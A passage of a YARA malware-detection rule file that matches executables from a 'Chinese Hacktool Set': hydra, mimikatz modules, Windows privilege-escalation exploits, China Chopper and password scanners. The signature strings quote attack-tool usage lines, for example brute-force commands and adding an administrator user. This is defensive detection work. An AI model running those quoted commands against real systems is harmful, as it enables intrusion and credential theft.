\".\\\\log\\\\Hscan.log\" fullword ascii\n\t\t$s6 = \"[%s]: Found cisco Enable password: %s !!!\" fullword ascii\n\t\t$s7 = \"%s@ftpscan#FTP Account:  %s/[null]\" fullword ascii\n\t\t$s8 = \".\\\\conf\\\\mysql_pass.dic\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule GoodToolset_pr {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file pr.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"f6676daf3292cff59ef15ed109c2d408369e8ac8\"\n\tstrings:\n\t\t$s1 = \"-->Got WMI process Pid: %d \" ascii\n\t\t$s2 = \"-->This exploit gives you a Local System shell \" ascii\n\t\t$s3 = \"wmiprvse.exe\" fullword ascii\n\t\t$s4 = \"Try the first %d time\" fullword ascii\n\t\t$s5 = \"-->Build&&Change By p \" ascii\n\t\t$s6 = \"root\\\\MicrosoftIISv2\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule hydra_7_4_1_hydra {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hydra.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"3411d0380a1c1ebf58a454765f94d4f1dd714b5b\"\n\tstrings:\n\t\t$s1 = \"%d of %d target%s%scompleted, %lu valid password%s found\" fullword ascii\n\t\t$s2 = \"[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD\" fullword ascii\n\t\t$s3 = \"hydra -P pass.txt target cisco-enable  (direct console access)\" fullword ascii\n\t\t$s4 = \"[%d][smb] Host: %s Account: %s Error: PASSWORD EXPIRED\" fullword ascii\n\t\t$s5 = \"[ERROR] SMTP LOGIN AUTH, either this auth is disabled\" fullword ascii\n\t\t$s6 = \"\\\"/login.php:user=^USER^&pass=^PASS^&mid=123:incorrect\\\"\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and 2 of them\n}\n\nrule CN_Tools_srss_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file srss.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"c418b30d004051bbf1b2d3be426936b95b5fea6f\"\n\tstrings:\n\t\t$x1 = \"used pepack!\" fullword ascii\n\n\t\t$s1 = \"KERNEL32.dll\" fullword ascii\n\t\t$s2 = \"KERNEL32.DLL\" fullword ascii\n\t\t$s3 = \"LoadLibraryA\" fullword ascii\n\t\t$s4 = \"GetProcAddress\" fullword ascii\n\t\t$s5 = \"VirtualProtect\" fullword ascii\n\t\t$s6 = \"VirtualAlloc\" fullword ascii\n\t\t$s7 = \"VirtualFree\" fullword ascii\n\t\t$s8 = \"ExitProcess\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and ( $x1 at 0 ) and filesize < 14KB and all of ($s*)\n}\n\nrule Dos_NtGod {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file NtGod.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"adefd901d6bbd8437116f0170b9c28a76d4a87bf\"\n\tstrings:\n\t\t$s0 = \"\\\\temp\\\\NtGodMode.exe\" ascii\n\t\t$s4 = \"NtGodMode.exe\" fullword ascii\n\t\t$s10 = \"ntgod.bat\" fullword ascii\n\t\t$s19 = \"sfxcmd\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 250KB and all of them\n}\n\nrule CN_Tools_VNCLink {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file VNCLink.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"cafb531822cbc0cfebbea864489eebba48081aa1\"\n\tstrings:\n\t\t$s1 = \"C:\\\\temp\\\\vncviewer4.log\" fullword ascii\n\t\t$s2 = \"[BL4CK] Patched by redsand || http://blacksecurity.org\" fullword ascii\n\t\t$s3 = \"fake release extendedVkey 0x%x, keysym 0x%x\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 580KB and 2 of them\n}\n\nrule tools_NTCmd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file NTCmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"a3ae8659b9a673aa346a60844208b371f7c05e3c\"\n\tstrings:\n\t\t$s1 = \"pipecmd \\\\\\\\%s -U:%s -P:\\\"\\\" %s\" fullword ascii\n\t\t$s2 = \"[Usage]:  %s <HostName|IP> <Username> <Password>\" fullword ascii\n\t\t$s3 = \"pipecmd \\\\\\\\%s -U:%s -P:%s %s\" fullword ascii\n\t\t$s4 = \"============By uhhuhy (Feb 18,2003) - http://www.cnhonker.net============\" fullword ascii /* PEStudio Blacklist: os */\n\t\t$s5 = \"=======================NTcmd v0.11 for HScan v1.20=======================\" fullword ascii\n\t\t$s6 = \"NTcmd>\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 80KB and 2 of them\n}\n\nrule mysql_pwd_crack {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file mysql_pwd_crack.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"57d1cb4d404688804a8c3755b464a6e6248d1c73\"\n\tstrings:\n\t\t$s1 = \"mysql_pwd_crack 127.0.0.1 -x 3306 -p root -d userdict.txt\" fullword ascii\n\t\t$s2 = \"Successfully --> username %s password %s \" fullword ascii\n\t\t$s3 = \"zhouzhen@gmail.com http://zhouzhen.eviloctal.org\" fullword ascii\n\t\t$s4 = \"-a automode  automatic crack the mysql password \" fullword ascii\n\t\t$s5 = \"mysql_pwd_crack 127.0.0.1 -x 3306 -a\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 1 of them\n}\n\nrule CmdShell64 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file CmdShell64.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5b92510475d95ae5e7cd6ec4c89852e8af34acf1\"\n\tstrings:\n\t\t$s1 = \"C:\\\\Windows\\\\System32\\\\JAVASYS.EXE\" fullword wide\n\t\t$s2 = \"ServiceCmdShell\" fullword ascii\n\t\t$s3 = \"<!-- If your application is designed to work with Windows 8.1, uncomment the fol\" ascii\n\t\t$s4 = \"ServiceSystemShell\" fullword wide\n\t\t$s5 = \"[Root@CmdShell ~]#\" fullword wide\n\t\t$s6 = \"Hello Man 2015 !\" fullword wide\n\t\t$s7 = \"CmdShell\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 30KB and 4 of them\n}\n\nrule Ms_Viru_v {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file v.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ecf4ba6d1344f2f3114d52859addee8b0770ed0d\"\n\tstrings:\n\t\t$s1 = \"c:\\\\windows\\\\system32\\\\command.com /c \" fullword ascii\n\t\t$s2 = \"Easy Usage Version -- Edited By: racle@tian6.com\" fullword ascii\n\t\t$s3 = \"OH,Sry.Too long command.\" fullword ascii\n\t\t$s4 = \"Success! Commander.\" fullword ascii\n\t\t$s5 = \"Hey,how can racle work without ur command ?\" fullword ascii\n\t\t$s6 = \"The exploit thread was unable to map the virtual 8086 address space\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 3 of them\n}\n\nrule CN_Tools_Vscan {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Vscan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"0365fe05e2de0f327dfaa8cd0d988dbb7b379612\"\n\tstrings:\n\t\t$s1 = \"[+] Usage: VNC_bypauth <target> <scantype> <option>\" fullword ascii\n\t\t$s2 = \"========RealVNC <= 4.1.1 Bypass Authentication Scanner=======\" fullword ascii\n\t\t$s3 = \"[+] Type VNC_bypauth <target>,<scantype> or <option> for more informations\" fullword ascii\n\t\t$s4 = \"VNC_bypauth -i 192.168.0.1,192.168.0.2,192.168.0.3,...\" fullword ascii\n\t\t$s5 = \"-vn:%-15s:%-7d  connection closed\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 60KB and 2 of them\n}\n\nrule Dos_iis {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file iis.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"61ffd2cbec5462766c6f1c44bd44eeaed4f3d2c7\"\n\tstrings:\n\t\t$s1 = \"comspec\" fullword ascii\n\t\t$s2 = \"program terming\" fullword ascii\n\t\t$s3 = \"WinSta0\\\\Defau\" fullword ascii\n\t\t$s4 = \"* FROM IIsWebInfo\" ascii\n\t\t$s5 = \"www.icehack.\" ascii\n\t\t$s6 = \"wmiprvse.exe\" fullword ascii\n\t\t$s7 = \"Pid: %d\" ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 70KB and all of them\n}\n\nrule IISPutScannesr {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file IISPutScannesr.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"2dd8fee20df47fd4eed5a354817ce837752f6ae9\"\n\tstrings:\n\t\t$s1 = \"yoda & M.o.D.\" ascii\n\t\t$s2 = \"-> come.to/f2f **************\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule Generate {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Generate.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"2cb4c3916271868c30c7b4598da697f59e9c7a12\"\n\tstrings:\n\t\t$s1 = \"C:\\\\TEMP\\\\\" fullword ascii\n\t\t$s2 = \"Connection Closed Gracefully.;Could not bind socket. Address and port are alread\" wide\n\t\t$s3 = \"$530 Please login with USER and PASS.\" fullword ascii\n\t\t$s4 = \"_Shell.exe\" fullword ascii\n\t\t$s5 = \"ftpcWaitingPassword\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 2000KB and 3 of them\n}\n\nrule Pc_rejoice {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file rejoice.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"fe634a9f5d48d5c64c8f8bfd59ac7d8965d8f372\"\n\tstrings:\n\t\t$s1 = \"@members.3322.net/dyndns/update?system=dyndns&hostname=\" fullword ascii\n\t\t$s2 = \"http://www.xxx.com/xxx.exe\" fullword ascii\n\t\t$s3 = \"@ddns.oray.com/ph/update?hostname=\" fullword ascii\n\t\t$s4 = \"No data to read.$Can not bind in port range (%d - %d)\" fullword wide\n\t\t$s5 = \"ListViewProcessListColumnClick!\" fullword ascii\n\t\t$s6 = \"http://iframe.ip138.com/ic.asp\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3000KB and 3 of them\n}\n\nrule ms11080_withcmd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ms11080_withcmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"745e5058acff27b09cfd6169caf6e45097881a49\"\n\tstrings:\n\t\t$s1 = \"Usage : ms11-080.exe cmd.exe Command \" fullword ascii\n\t\t$s2 = \"\\\\ms11080\\\\ms11080\\\\Debug\\\\ms11080.pdb\" fullword ascii\n\t\t$s3 = \"[>] by:Mer4en7y@90sec.org\" fullword ascii\n\t\t$s4 = \"[>] create porcess error\" fullword ascii\n\t\t$s5 = \"[>] ms11-080 Exploit\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and 1 of them\n}\n\nrule OtherTools_xiaoa {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file xiaoa.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"6988acb738e78d582e3614f83993628cf92ae26d\"\n\tstrings:\n\t\t$s1 = \"Usage:system_exp.exe \\\"cmd\\\"\" fullword ascii\n\t\t$s2 = \"The shell \\\"cmd\\\" success!\" fullword ascii\n\t\t$s3 = \"Not Windows NT family OS.\" fullword ascii /* PEStudio Blacklist: os */\n\t\t$s4 = \"Unable to get kernel base address.\" fullword ascii\n\t\t$s5 = \"run \\\"%s\\\" failed,code: %d\" fullword ascii\n\t\t$s6 = \"Windows Kernel Local Privilege Exploit \" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule unknown2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file unknown2.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"32508d75c3d95e045ddc82cb829281a288bd5aa3\"\n\tstrings:\n\t\t$s1 = \"http://md5.com.cn/index.php/md5reverse/index/md/\" fullword wide\n\t\t$s2 = \"http://www.md5decrypter.co.uk/feed/api.aspx?\" fullword wide\n\t\t$s3 = \"http://www.md5.com.cn\" fullword wide\n\t\t$s4 = \"1.5.exe\" fullword wide\n\t\t$s5 = \"\\\\Set.ini\" fullword wide\n\t\t$s6 = \"OpenFileDialog1\" fullword wide\n\t\t$s7 = \" (*.txt)|*.txt\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and 4 of them\n}\n\nrule hydra_7_3_hydra {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hydra.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"2f82b8bf1159e43427880d70bcd116dc9e8026ad\"\n\tstrings:\n\t\t$s1 = \"[ATTEMPT-ERROR] target %s - login \\\"%s\\\" - pass \\\"%s\\\" - child %d - %lu of %lu\" fullword ascii\n\t\t$s2 = \"(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=))(COMMAND=reload)(PASSWORD=%s)(SERVICE\" ascii\n\t\t$s3 = \"cn=^USER^,cn=users,dc=foo,dc=bar,dc=com for domain foo.bar.com\" fullword ascii\n\t\t$s4 = \"[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD\" fullword ascii\n\t\t$s5 = \"hydra -P pass.txt target cisco-enable  (direct console access)\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 700KB and 1 of them\n}\n\nrule OracleScan {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file OracleScan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"10ff7faf72fe6da8f05526367b3522a2408999ec\"\n\tstrings:\n\t\t$s1 = \"MYBLOG:HTTP://HI.BAIDU.COM/0X24Q\" fullword ascii\n\t\t$s2 = \"\\\\Borland\\\\Delphi\\\\RTL\" fullword ascii\n\t\t$s3 = \"USER_NAME\" ascii\n\t\t$s4 = \"FROMWWHERE\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule SQLTools {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file SQLTools.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"38a9caa2079afa2c8d7327e7762f7ed9a69056f7\"\n\tstrings:\n\t\t$s1 = \"DBN_POST\" fullword wide\n\t\t$s2 = \"LOADER ERROR\" fullword ascii\n\t\t$s3 = \"www.1285.net\" fullword wide\n\t\t$s4 = \"TUPFILEFORM\" fullword wide\n\t\t$s5 = \"DBN_DELETE\" fullword wide\n\t\t$s6 = \"DBINSERT\" fullword wide\n\t\t$s7 = \"Copyright (C) Kibosoft Corp. 2001-2006\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 2350KB and all of them\n}\n\nrule portscanner {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file portscanner.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"1de367d503fdaaeee30e8ad7c100dd1e320858a4\"\n\tstrings:\n\t\t$s0 = \"PortListfNo\" fullword ascii\n\t\t$s1 = \".533.net\" fullword ascii\n\t\t$s2 = \"CRTDLL.DLL\" fullword ascii\n\t\t$s3 = \"exitfc\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 25KB and all of them\n}\n\nrule kappfree {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file kappfree.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"e57e79f190f8a24ca911e6c7e008743480c08553\"\n\tstrings:\n\t\t$s1 = \"Bienvenue dans un processus distant\" fullword wide\n\t\t$s2 = \"kappfree.dll\" fullword ascii\n\t\t$s3 = \"kappfree de mimikatz pour Windows (anti AppLocker)\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule Smartniff {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Smartniff.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"67609f21d54a57955d8fe6d48bc471f328748d0a\"\n\tstrings:\n\t\t$s1 = \"smsniff.exe\" fullword wide\n\t\t$s2 = \"support@nirsoft.net0\" fullword ascii\n\t\t$s3 = \"</requestedPrivileges></security></trustInfo></assembly>\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule ChinaChopper_caidao {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file caidao.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"056a60ec1f6a8959bfc43254d97527b003ae5edb\"\n\tstrings:\n\t\t$s1 = \"Pass,Config,n{)\" fullword ascii\n\t\t$s2 = \"phMYSQLZ\" fullword ascii\n\t\t$s3 = \"\\\\DHLP\\\\.\" fullword ascii\n\t\t$s4 = \"\\\\dhlp\\\\.\" fullword ascii\n\t\t$s5 = \"SHAutoComple\" fullword ascii\n\t\t$s6 = \"MainFrame\" ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1077KB and all of them\n}\n\nrule KiwiTaskmgr_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file KiwiTaskmgr.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16\"\n\tstrings:\n\t\t$s1 = \"Process Ok, Memory Ok, resuming process :)\" fullword wide\n\t\t$s2 = \"Kiwi Taskmgr no-gpo\" fullword wide\n\t\t$s3 = \"KiwiAndTaskMgr\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule kappfree_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file kappfree.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5d578df9a71670aa832d1cd63379e6162564fb6b\"\n\tstrings:\n\t\t$s1 = \"kappfree.dll\" fullword ascii\n\t\t$s2 = \"kappfree de mimikatz pour Windows (anti AppLocker)\" fullword wide\n\t\t$s3 = \"' introuvable !\" fullword wide\n\t\t$s4 = \"kiwi\\\\mimikatz\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and 2 of them\n}\n\nrule x_way2_5_sqlcmd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file sqlcmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5152a57e3638418b0d97a42db1c0fc2f893a2794\"\n\tstrings:\n\t\t$s1 = \"LOADER ERROR\" fullword ascii\n\t\t$s2 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii\n\t\t$s3 = \"The ordinal %u could not be located in the dynamic link library %s\" fullword ascii\n\t\t$s4 = \"kernel32.dll\" fullword ascii\n\t\t$s5 = \"VirtualAlloc\" fullword ascii\n\t\t$s6 = \"VirtualFree\" fullword ascii\n\t\t$s7 = \"VirtualProtect\" fullword ascii\n\t\t$s8 = \"ExitProcess\" fullword ascii\n\t\t$s9 = \"user32.dll\" fullword ascii\n\t\t$s16 = \"MessageBoxA\" fullword ascii\n\t\t$s10 = \"wsprintfA\" fullword ascii\n\t\t$s11 = \"kernel32.dll\" fullword ascii\n\t\t$s12 = \"GetProcAddress\" fullword ascii\n\t\t$s13 = \"GetModuleHandleA\" fullword ascii\n\t\t$s14 = \"LoadLibraryA\" fullword ascii\n\t\t$s15 = \"odbc32.dll\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 23KB and filesize > 20KB and all of them\n}\n\nrule Win32_klock {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file klock.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"7addce4434670927c4efaa560524680ba2871d17\"\n\tstrings:\n\t\t$s1 = \"klock.dll\" fullword ascii\n\t\t$s2 = \"Erreur : impossible de basculer le bureau ; SwitchDesktop : \" fullword wide\n\t\t$s3 = \"klock de mimikatz pour Windows\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 250KB and all of them\n}\n\nrule ipsearcher {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ipsearcher.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"1e96e9c5c56fcbea94d26ce0b3f1548b224a4791\"\n\tstrings:\n\t\t$s0 = \"http://www.wzpg.com\" fullword ascii\n\t\t$s1 = \"ipsearcher\\\\ipsearcher\\\\Release\\\\ipsearcher.pdb\" fullword ascii\n\t\t$s3 = \"_GetAddress\" fullword ascii\n\t\t$s5 = \"ipsearcher.dll\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 140KB and all of them\n}\n\nrule ms10048_x64 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ms10048-x64.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"418bec3493c85e3490e400ecaff5a7760c17a0d0\"\n\tstrings:\n\t\t$s1 = \"The target is most likely patched.\" fullword ascii\n\t\t$s2 = \"Dojibiron by Ronald Huizer, (c) master#h4cker.us  \" fullword ascii\n\t\t$s3 = \"[ ] Creating evil window\" fullword ascii\n\t\t$s4 = \"[+] Set to %d exploit half succeeded\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 40KB and 1 of them\n}\n\nrule hscangui {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hscangui.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"af8aced0a78e1181f4c307c78402481a589f8d07\"\n\tstrings:\n\t\t$s1 = \"[%s]: Found \\\"FTP account: anyone/anyone@any.net\\\"  !!!\" fullword ascii\n\t\t$s2 = \"http://www.cnhonker.com\" fullword ascii\n\t\t$s3 = \"%s@ftpscan#Cracked account:  %s/%s\" fullword ascii\n\t\t$s4 = \"[%s]: Found \\\"FTP account: %s/%s\\\" !!!\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 220KB and 2 of them\n}\n\nrule GoodToolset_ms11080 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ms11080.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"f0854c49eddf807f3a7381d3b20f9af4a3024e9f\"\n\tstrings:\n\t\t$s1 = \"[*] command add user 90sec 90sec\" fullword ascii\n\t\t$s2 = \"\\\\ms11080\\\\Debug\\\\ms11080.pdb\" fullword ascii\n\t\t$s3 = \"[>] by:Mer4en7y@90sec.org\" fullword ascii\n\t\t$s4 = \"[*] Add to Administrators success\" fullword ascii\n\t\t$s5 = \"[*] User has been successfully added\" fullword ascii\n\t\t$s6 = \"[>] ms11-08 Exploit\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 240KB and 2 of them\n}\n\nrule epathobj_exp64 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file epathobj_exp64.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"09195ba4e25ccce35c188657957c0f2c6a61d083\"\n\tstrings:\n\t\t$s1 = \"Watchdog thread %d waiting on Mutex\" fullword ascii\n\t\t$s2 = \"Exploit ok run command\" fullword ascii\n\t\t$s3 = \"\\\\epathobj_exp\\\\x64\\\\Release\\\\epathobj_exp.pdb\" fullword ascii\n\t\t$s4 = \"Alllocated userspace PATHRECORD () %p\" fullword ascii\n\t\t$s5 = \"Mutex object did not timeout, list not patched\" fullword ascii\n\t\t$s6 = \"- inconsistent onexit begin-end variables\" fullword wide  /* Goodware String - occured 96 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 150KB and 2 of them\n}\n\nrule kelloworld_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file kelloworld.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"55d5dabd96c44d16e41f70f0357cba1dda26c24f\"\n\tstrings:\n\t\t$s1 = \"Hello World!\" fullword wide\n\t\t$s2 = \"kelloworld.dll\" fullword ascii\n\t\t$s3 = \"kelloworld de mimikatz pour Windows\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule HScan_v1_20_hscan {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hscan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"568b06696ea0270ee1a744a5ac16418c8dacde1c\"\n\tstrings:\n\t\t$s1 = \"[%s]: Found \\\"FTP account: anyone/anyone@any.net\\\"  !!!\" fullword ascii\n\t\t$s2 = \"%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,100\" fullword ascii\n\t\t$s3 = \".\\\\report\\\\%s-%s.html\" fullword ascii\n\t\t$s4 = \".\\\\log\\\\Hscan.log\" fullword ascii\n\t\t$s5 = \"[%s]: Found cisco Enable password: %s !!!\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and 2 of them\n}\n\nrule _Project1_Generate_rejoice {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - from files Project1.exe, Generate.exe, rejoice.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\tsuper_rule = 1\n\t\thash0 = \"d1a5e3b646a16a7fcccf03759bd0f96480111c96\"\n\t\thash1 = \"2cb4c3916271868c30c7b4598da697f59e9c7a12\"\n\t\thash2 = \"fe634a9f5d48d5c64c8f8bfd59ac7d8965d8f372\"\n\tstrings:\n\t\t$s1 = \"sfUserAppDataRoaming\" fullword ascii\n\t\t$s2 = \"$TRzFrameControllerPropertyConnection\" fullword ascii\n\t\t$s3 = \"delphi32.exe\" fullword ascii\n\t\t$s4 = \"hkeyCurrentUser\" fullword ascii\n\t\t$s5 = \"%s is not a valid IP address.\" fullword wide\n\t\t$s6 = \"Citadel hooking error\" fullword 